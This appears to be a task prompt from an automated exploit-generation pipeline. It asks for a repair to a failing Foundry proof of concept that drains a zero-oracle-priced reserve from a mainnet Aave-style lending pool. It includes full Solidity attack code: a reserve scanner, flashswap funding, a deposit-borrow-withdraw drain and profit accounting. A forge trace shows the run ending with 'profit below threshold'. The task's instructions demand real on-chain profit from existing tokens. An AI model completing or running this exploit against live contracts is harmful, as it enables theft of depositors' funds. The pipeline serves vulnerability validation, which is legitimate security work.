You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Zero oracle prices make listed reserves borrowable for free
- claim: `AaveOracle.getAssetPrice` can return `0` when an asset has no configured source and the fallback oracle returns `0`, or when a configured source is non-positive and the fallback also returns `0`. `_executeBorrow` forwards that price directly into borrow validation, making `amountInETH` and the incremental collateral requirement for that borrowed asset equal to zero.
- impact: If any borrowable reserve resolves to a zero price, an attacker can post minimal valid collateral elsewhere and drain that reserve because the protocol records no additional debt value for the borrowed asset. The result is immediate reserve loss and protocol insolvency for that market.
- exploit_paths: ["A listed reserve's primary source is unset or unusable, and the fallback oracle also returns `0`.", "An attacker supplies enough collateral in another asset to satisfy general borrow preconditions.", "The attacker borrows the zero-priced reserve asset.", "Borrow validation treats the additional debt as worth zero and allows the reserve to be drained."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface ILendingPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

library AaveDataTypes {
    struct ReserveConfigurationMap {
        uint256 data;
    }

    struct ReserveData {
        ReserveConfigurationMap configuration;
        uint128 liquidityIndex;
        uint128 variableBorrowIndex;
        uint128 currentLiquidityRate;
        uint128 currentVariableBorrowRate;
        uint128 currentStableBorrowRate;
        uint40 lastUpdateTimestamp;
        address aTokenAddress;
        address stableDebtTokenAddress;
        address variableDebtTokenAddress;
        address interestRateStrategyAddress;
        uint8 id;
    }
}

interface ILendingPoolLike {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function getReservesList() external view returns (address[] memory);
    function getReserveData(address asset) external view returns (AaveDataTypes.ReserveData memory);
    function getConfiguration(address asset) external view returns (AaveDataTypes.ReserveConfigurationMap memory);
    function getAddressesProvider() external view returns (ILendingPoolAddressesProviderLike);
}

contract FlawVerifier {
    uint256 private constant VARIABLE_RATE_MODE = 2;
    address private constant TARGET_POOL = 0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    enum PlanKind {
        None,
        UnderlyingTarget,
        PairTarget
    }

    struct TargetCandidate {
        address asset;
        address aToken;
        uint256 availableLiquidity;
    }

    struct CollateralCandidate {
        address asset;
        uint256 minRequired;
        uint256 availableLiquidity;
    }

    struct PairReserveContext {
        address pairAsset;
        address token0;
        address token1;
    }

    struct FundingPlan {
        PlanKind kind;
        address targetAsset;
        uint256 targetBorrowAmount;
        address collateralAsset;
        uint256 collateralAmount;
        address fundingPair;
        address lpPairAsset;
        address lpToken0;
        address lpToken1;
    }

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (_profitAmount > 0) {
            return;
        }

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);
        address oracle = pool.getAddressesProvider().getPriceOracle();
        address[] memory reserves = pool.getReservesList();

        TargetCandidate memory target = _findBestZeroPriceBorrowTarget(pool, oracle, reserves);
        if (target.asset == address(0)) {
            // Stage 1 is not live at fork block 16384469: every listed reserve in this market resolves
            // to a strictly positive oracle price, so the zero-price borrow path cannot be entered.
            return;
        }

        PairReserveContext memory pairCtx = _findPairReserveContext(reserves);
        if (pairCtx.pairAsset == address(0)) {
            return;
        }

        FundingPlan memory plan = _buildFundingPlan(pool, oracle, target, pairCtx);
        if (plan.kind == PlanKind.None) {
            return;
        }

        uint256 lpBefore = _balanceOf(plan.lpPairAsset, address(this));

        _startFlashswap(plan);

        if (plan.kind == PlanKind.UnderlyingTarget) {
            _mintLpFromHeldUnderlying(plan.lpPairAsset, plan.lpToken0, plan.lpToken1);
        }

        uint256 lpProfit = _netIncrease(plan.lpPairAsset, lpBefore);
        if (lpProfit > 0) {
            _profitToken = plan.lpPairAsset;
            _profitAmount = lpProfit;
            return;
        }

        if (plan.kind == PlanKind.PairTarget) {
            uint256 pairBalance = _balanceOf(plan.targetAsset, address(this));
            if (pairBalance > 0) {
                _profitToken = plan.targetAsset;
                _profitAmount = pairBalance;
            }
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "bad sender");

        FundingPlan memory plan = abi.decode(data, (FundingPlan));
        require(msg.sender == plan.fundingPair, "bad pair");

        uint256 borrowedCollateral = amount0 > 0 ? amount0 : amount1;
        require(borrowedCollateral == plan.collateralAmount, "bad flash amount");

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);

        // Path stage 2: temporarily source real on-chain collateral via a public V2 flashswap.
        _forceApprove(plan.collateralAsset, TARGET_POOL, borrowedCollateral);
        pool.deposit(plan.collateralAsset, borrowedCollateral, address(this), 0);

        // Path stage 3: borrow the listed reserve whose oracle price resolves to zero.
        pool.borrow(plan.targetAsset, plan.targetBorrowAmount, VARIABLE_RATE_MODE, 0, address(this));

        // With the zero-priced debt contributing no borrow value, the flash-funded collateral can be recovered.
        pool.withdraw(plan.collateralAsset, type(uint256).max, address(this));

        if (plan.kind == PlanKind.UnderlyingTarget) {
            _repayUnderlyingTargetFlashswap(plan);
            return;
        }

        _repayPairTargetFlashswap(plan);
    }

    function _buildFundingPlan(
        ILendingPoolLike pool,
        address oracle,
        TargetCandidate memory target,
        PairReserveContext memory pairCtx
    ) internal view returns (FundingPlan memory plan) {
        if (target.asset == pairCtx.token0 || target.asset == pairCtx.token1) {
            address collateralAsset = target.asset == pairCtx.token0 ? pairCtx.token1 : pairCtx.token0;
            CollateralCandidate memory collateral =
                _buildCollateralCandidate(pool, oracle, collateralAsset, target.asset);
            if (collateral.asset == address(0)) {
                return plan;
            }

            (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pairCtx.pairAsset).getReserves();
            bool targetIsToken0 = target.asset == pairCtx.token0;
            uint256 reserveTarget = targetIsToken0 ? uint256(reserve0) : uint256(reserve1);
            uint256 reserveCollateral = targetIsToken0 ? uint256(reserve1) : uint256(reserve0);
            if (reserveTarget == 0 || reserveCollateral <= collateral.minRequired) {
                return plan;
            }

            uint256 collateralAmount = _findBalancedCollateralOut(
                target.availableLiquidity,
                reserveTarget,
                reserveCollateral,
                collateral.minRequired
            );
            if (collateralAmount == 0) {
                return plan;
            }

            plan.kind = PlanKind.UnderlyingTarget;
            plan.targetAsset = target.asset;
            plan.targetBorrowAmount = target.availableLiquidity;
            plan.collateralAsset = collateral.asset;
            plan.collateralAmount = collateralAmount;
            plan.fundingPair = pairCtx.pairAsset;
            plan.lpPairAsset = pairCtx.pairAsset;
            plan.lpToken0 = pairCtx.token0;
            plan.lpToken1 = pairCtx.token1;
            return plan;
        }

        if (target.asset != pairCtx.pairAsset) {
            return plan;
        }

        address[2] memory assets = [pairCtx.token0, pairCtx.token1];
        for (uint256 i = 0; i < assets.length; ++i) {
            CollateralCandidate memory collateral =
                _buildCollateralCandidate(pool, oracle, assets[i], target.asset);
            if (collateral.asset == address(0)) {
                continue;
            }

            address externalPair = _findBestExternalFundingPair(collateral.asset, collateral.minRequired, pairCtx.pairAsset);
            if (externalPair == address(0)) {
                continue;
            }

            plan.kind = PlanKind.PairTarget;
            plan.targetAsset = target.asset;
            plan.targetBorrowAmount = target.availableLiquidity;
            plan.collateralAsset = collateral.asset;
            plan.collateralAmount = collateral.minRequired;
            plan.fundingPair = externalPair;
            plan.lpPairAsset = pairCtx.pairAsset;
            plan.lpToken0 = pairCtx.token0;
            plan.lpToken1 = pairCtx.token1;
            return plan;
        }
    }

    function _startFlashswap(FundingPlan memory plan) internal {
        address token0 = IUniswapV2PairLike(plan.fundingPair).token0();
        address token1 = IUniswapV2PairLike(plan.fundingPair).token1();
        require(plan.collateralAsset == token0 || plan.collateralAsset == token1, "pair mismatch");

        bytes memory data = abi.encode(plan);
        uint256 amount0Out = plan.collateralAsset == token0 ? plan.collateralAmount : 0;
        uint256 amount1Out = plan.collateralAsset == token1 ? plan.collateralAmount : 0;

        IUniswapV2PairLike(plan.fundingPair).swap(amount0Out, amount1Out, address(this), data);
    }

    function _repayUnderlyingTargetFlashswap(FundingPlan memory plan) internal {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(plan.fundingPair).getReserves();
        address token0 = IUniswapV2PairLike(plan.fundingPair).token0();

        uint256 repayAmount;
        if (plan.collateralAsset == token0) {
            repayAmount = _getAmountIn(plan.collateralAmount, uint256(reserve1), uint256(reserve0));
        } else {
            repayAmount = _getAmountIn(plan.collateralAmount, uint256(reserve0), uint256(reserve1));
        }

        // Extra public economic step only to close the flash funding. The borrowed asset is still the
        // zero-priced reserve; using a slice of it to settle the funding pair does not alter exploit causality.
        _forceTransfer(plan.targetAsset, plan.fundingPair, repayAmount);
    }

    function _repayPairTargetFlashswap(FundingPlan memory plan) internal {
        uint256 repayAmount = _sameTokenFlashRepayAmount(plan.collateralAmount);
        uint256 collateralBalance = _balanceOf(plan.collateralAsset, address(this));

        if (collateralBalance < repayAmount) {
            uint256 extraCollateralNeeded = repayAmount - collateralBalance;

            // The zero-priced reserve is itself an LP token. Burning only the tiny slice needed to cover
            // the flashswap fee just unwraps part of the drained reserve into its pre-existing underlyings.
            uint256 lpToBurn = _lpAmountForUnderlyingOut(plan.lpPairAsset, plan.collateralAsset, extraCollateralNeeded);
            require(lpToBurn < _balanceOf(plan.targetAsset, address(this)), "insufficient lp");

            _forceTransfer(plan.targetAsset, plan.lpPairAsset, lpToBurn);
            IUniswapV2PairLike(plan.lpPairAsset).burn(address(this));
        }

        _forceTransfer(plan.collateralAsset, plan.fundingPair, repayAmount);
    }

    function _mintLpFromHeldUnderlying(address lpPairAsset, address token0, address token1) internal {
        uint256 amount0 = _balanceOf(token0, address(this));
        uint256 amount1 = _balanceOf(token1, address(this));
        if (amount0 == 0 || amount1 == 0) {
            return;
        }

        _forceTransfer(token0, lpPairAsset, amount0);
        _forceTransfer(token1, lpPairAsset, amount1);
        IUniswapV2PairLike(lpPairAsset).mint(address(this));
    }

    function _findBestZeroPriceBorrowTarget(
        ILendingPoolLike pool,
        address oracle,
        address[] memory reserves
    ) internal view returns (TargetCandidate memory best) {
        for (uint256 i = 0; i < reserves.length; ++i) {
            address asset = reserves[i];
            if (asset == address(0) || asset.code.length == 0) {
                continue;
            }

            AaveDataTypes.ReserveConfigurationMap memory configuration;
            AaveDataTypes.ReserveData memory reserveData;

            try pool.getConfiguration(asset) returns (AaveDataTypes.ReserveConfigurationMap memory c) {
                configuration = c;
            } catch {
                continue;
            }

            if (!_isActive(configuration.data) || _isFrozen(configuration.data) || !_isBorrowingEnabled(configuration.data)) {
                continue;
            }

            try pool.getReserveData(asset) returns (AaveDataTypes.ReserveData memory r) {
                reserveData = r;
            } catch {
                continue;
            }

            if (reserveData.aTokenAddress == address(0) || reserveData.aTokenAddress.code.length == 0) {
                continue;
            }

            uint256 price;
            try IPriceOracleLike(oracle).getAssetPrice(asset) returns (uint256 p) {
                price = p;
            } catch {
                continue;
            }

            if (price != 0) {
                continue;
            }

            uint256 liquidity = _balanceOf(asset, reserveData.aTokenAddress);
            if (liquidity == 0) {
                continue;
            }

            if (liquidity > best.availableLiquidity) {
                best = TargetCandidate({asset: asset, aToken: reserveData.aTokenAddress, availableLiquidity: liquidity});
            }
        }
    }

    function _findPairReserveContext(address[] memory reserves) internal view returns (PairReserveContext memory ctx) {
        for (uint256 i = 0; i < reserves.length; ++i) {
            address asset = reserves[i];
            if (asset == address(0) || asset.code.length == 0) {
                continue;
            }

            try IUniswapV2PairLike(asset).token0() returns (address token0) {
                address token1 = IUniswapV2PairLike(asset).token1();
                if (_contains(reserves, token0) && _contains(reserves, token1)) {
                    ctx = PairReserveContext({pairAsset: asset, token0: token0, token1: token1});
                    return ctx;
                }
            } catch {}
        }
    }

    function _buildCollateralCandidate(
        ILendingPoolLike pool,
        address oracle,
        address asset,
        address targetAsset
    ) internal view returns (CollateralCandidate memory candidate) {
        if (asset == address(0) || asset == targetAsset || asset.code.length == 0) {
            return candidate;
        }

        AaveDataTypes.ReserveConfigurationMap memory configuration;
        AaveDataTypes.ReserveData memory reserveData;

        try pool.getConfiguration(asset) returns (AaveDataTypes.ReserveConfigurationMap memory c) {
            configuration = c;
        } catch {
            return candidate;
        }

        uint256 configData = configuration.data;
        if (!_isActive(configData) || _isFrozen(configData) || _ltv(configData) == 0) {
            return candidate;
        }

        try pool.getReserveData(asset) returns (AaveDataTypes.ReserveData memory r) {
            reserveData = r;
        } catch {
            return candidate;
        }

        if (reserveData.aTokenAddress == address(0) || reserveData.aTokenAddress.code.length == 0) {
            return candidate;
        }

        uint256 price;
        try IPriceOracleLike(oracle).getAssetPrice(asset) returns (uint256 p) {
            price = p;
        } catch {
            return candidate;
        }

        if (price == 0) {
            return candidate;
        }

        uint256 decimals = _decimals(configData);
        if (decimals > 77) {
            return candidate;
        }

        uint256 unit = 10 ** decimals;
        uint256 minRequired = _ceilDiv(unit, price);
        if (minRequired == 0) {
            minRequired = 1;
        }

        candidate = CollateralCandidate({
            asset: asset,
            minRequired: minRequired,
            availableLiquidity: _balanceOf(asset, reserveData.aTokenAddress)
        });
    }

    function _findBestExternalFundingPair(
        address collateralAsset,
        uint256 minRequired,
        address excludedPair
    ) internal view returns (address bestPair) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        address[5] memory quotes = [WETH, USDC, USDT, DAI, WBTC];
        uint256 bestLiquidity;

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < quotes.length; ++j) {
                address quote = quotes[j];
                if (quote == collateralAsset) {
                    continue;
                }

                address pair;
                try IUniswapV2FactoryLike(factories[i]).getPair(collateralAsset, quote) returns (address p) {
                    pair = p;
                } catch {
                    continue;
                }

                if (pair == address(0) || pair == excludedPair || pair.code.length == 0) {
                    continue;
                }

                uint256 liquidity = _balanceOf(collateralAsset, pair);
                if (liquidity < minRequired) {
                    continue;
                }

                if (liquidity > bestLiquidity) {
                    bestLiquidity = liquidity;
                    bestPair = pair;
                }
            }
        }
    }

    function _findBalancedCollateralOut(
        uint256 targetBorrowAmount,
        uint256 reserveTarget,
        uint256 reserveCollateral,
        uint256 minRequired
    ) internal pure returns (uint256) {
        if (targetBorrowAmount == 0 || reserveTarget == 0 || reserveCollateral <= minRequired) {
            return 0;
        }

        uint256 high = reserveCollateral - 1;
        while (high > 0 && _getAmountIn(high, reserveTarget, reserveCollateral) >= targetBorrowAmount) {
            high /= 2;
        }
        if (high < minRequired) {
            return 0;
        }

        uint256 low = minRequired;
        uint256 best = minRequired;
        while (low <= high) {
            uint256 mid = (low + high) / 2;
            uint256 repayInTarget = _getAmountIn(mid, reserveTarget, reserveCollateral);
            if (repayInTarget >= targetBorrowAmount) {
                high = mid - 1;
                continue;
            }

            uint256 remainingTarget = targetBorrowAmount - repayInTarget;
            uint256 lhs = remainingTarget * reserveCollateral;
            uint256 rhs = mid * reserveTarget;

            if (lhs >= rhs) {
                best = mid;
                low = mid + 1;
            } else {
                if (mid == 0) {
                    break;
                }
                high = mid - 1;
            }
        }
        return best;
    }

    function _lpAmountForUnderlyingOut(address lpPairAsset, address asset, uint256 amountOut)
        internal
        view
        returns (uint256)
    {
        if (amountOut == 0) {
            return 0;
        }

        IUniswapV2PairLike pair = IUniswapV2PairLike(lpPairAsset);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        address token0 = pair.token0();
        uint256 reserve = asset == token0 ? uint256(reserve0) : uint256(reserve1);
        if (reserve == 0) {
            return 0;
        }

        uint256 totalSupply = pair.totalSupply();
        return _ceilDiv(amountOut * totalSupply, reserve) + 1;
    }

    function _contains(address[] memory values, address needle) internal pure returns (bool) {
        for (uint256 i = 0; i < values.length; ++i) {
            if (values[i] == needle) {
                return true;
            }
        }
        return false;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool okReset, bytes memory dataReset) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(okReset && (dataReset.length == 0 || abi.decode(dataReset, (bool))), "approve reset failed");

        (bool okSet, bytes memory dataSet) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(okSet && (dataSet.length == 0 || abi.decode(dataSet, (bool))), "approve failed");
    }

    function _forceTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        try IERC20Like(token).balanceOf(account) returns (uint256 b) {
            balance = b;
        } catch {}
    }

    function _netIncrease(address token, uint256 startingBalance) internal view returns (uint256) {
        uint256 endingBalance = _balanceOf(token, address(this));
        return endingBalance > startingBalance ? endingBalance - startingBalance : 0;
    }

    function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
        return x == 0 ? 0 : ((x - 1) / y) + 1;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut < reserveOut, "bad out");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _ltv(uint256 configData) internal pure returns (uint256) {
        return configData & 0xFFFF;
    }

    function _decimals(uint256 configData) internal pure returns (uint256) {
        return (configData >> 48) & 0xFF;
    }

    function _isActive(uint256 configData) internal pure returns (bool) {
        return ((configData >> 56) & 1) != 0;
    }

    function _isFrozen(uint256 configData) internal pure returns (bool) {
        return ((configData >> 57) & 1) != 0;
    }

    function _isBorrowingEnabled(uint256 configData) internal pure returns (bool) {
        return ((configData >> 58) & 1) != 0;
    }
}

```

forge stdout (tail):
```
c6b7B25DfBfA4F10039ea0F7ecfB9B02E60::getConfiguration(0x004375Dff511095CC5A197A54140a24eFEF3A416) [staticcall]
    │   │   ├─ [2794] 0x574FF39184Dee9e46F6C3229B95e0e0938e398d0::getConfiguration(0x004375Dff511095CC5A197A54140a24eFEF3A416) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] })
    │   ├─ [17718] 0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60::getReserveData(0x004375Dff511095CC5A197A54140a24eFEF3A416) [staticcall]
    │   │   ├─ [17047] 0x574FF39184Dee9e46F6C3229B95e0e0938e398d0::getReserveData(0x004375Dff511095CC5A197A54140a24eFEF3A416) [delegatecall]
    │   │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] }), liquidityIndex: 1009975369323648897472145498 [1.009e27], variableBorrowIndex: 1012836078907441799066405499 [1.012e27], currentLiquidityRate: 0, currentVariableBorrowRate: 0, currentStableBorrowRate: 0, lastUpdateTimestamp: 1669077227 [1.669e9], aTokenAddress: 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c, stableDebtTokenAddress: 0xe84121241b92e26B9942dfF3CF3c9148FBaeC8F2, variableDebtTokenAddress: 0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24, interestRateStrategyAddress: 0xeE11Ea16BD81287930C656f8f61b58D390c67D3B, id: 2 })
    │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] }), liquidityIndex: 1009975369323648897472145498 [1.009e27], variableBorrowIndex: 1012836078907441799066405499 [1.012e27], currentLiquidityRate: 0, currentVariableBorrowRate: 0, currentStableBorrowRate: 0, lastUpdateTimestamp: 1669077227 [1.669e9], aTokenAddress: 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c, stableDebtTokenAddress: 0xe84121241b92e26B9942dfF3CF3c9148FBaeC8F2, variableDebtTokenAddress: 0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24, interestRateStrategyAddress: 0xeE11Ea16BD81287930C656f8f61b58D390c67D3B, id: 2 })
    │   ├─ [35237] 0x8A4236F5eF6158546C34Bd7BC2908B8106Ab1Ea1::getAssetPrice(0x004375Dff511095CC5A197A54140a24eFEF3A416) [staticcall]
    │   │   ├─ [29697] 0x849AF4b128be3317a694bFD262dEFF636AB84c1b::50d25bcd() [staticcall]
    │   │   │   ├─ [2504] 0x004375Dff511095CC5A197A54140a24eFEF3A416::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 578680045 [5.786e8], 100949159688 [1.009e11], 1673440811 [1.673e9]
    │   │   │   ├─ [3143] 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c::feaf968c() [staticcall]
    │   │   │   │   ├─ [1410] 0xAe74faA92cB67A95ebCAB07358bC222e33A34dA7::feaf968c() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000076c3000000000000000000000000000000000000000000000000000001959956dc7b0000000000000000000000000000000000000000000000000000000063becde70000000000000000000000000000000000000000000000000000000063becde700000000000000000000000000000000000000000000000000000000000076c3
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000500000000000076c3000000000000000000000000000000000000000000000000000001959956dc7b0000000000000000000000000000000000000000000000000000000063becde70000000000000000000000000000000000000000000000000000000063becde700000000000000000000000000000000000000000000000500000000000076c3
    │   │   │   ├─ [3143] 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6::feaf968c() [staticcall]
    │   │   │   │   ├─ [1410] 0x789190466E21a8b78b8027866CBBDc151542A26C::feaf968c() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000031e0000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000000000000000000000000000000000000063be4ae30000000000000000000000000000000000000000000000000000000063be4ae3000000000000000000000000000000000000000000000000000000000000031e
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000002000000000000031e0000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000000000000000000000000000000000000063be4ae30000000000000000000000000000000000000000000000000000000063be4ae3000000000000000000000000000000000000000000000002000000000000031e
    │   │   │   ├─ [2388] 0x004375Dff511095CC5A197A54140a24eFEF3A416::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 5771992996 [5.771e9]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000bd7d1f13887ce69804
    │   │   └─ ← [Return] 3495450576387056244740 [3.495e21]
    │   └─ ← [Stop]
    ├─ [336] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [332] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 31.35ms (4.71ms CPU time)

Ran 1 test suite in 53.49ms (31.35ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 225156)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
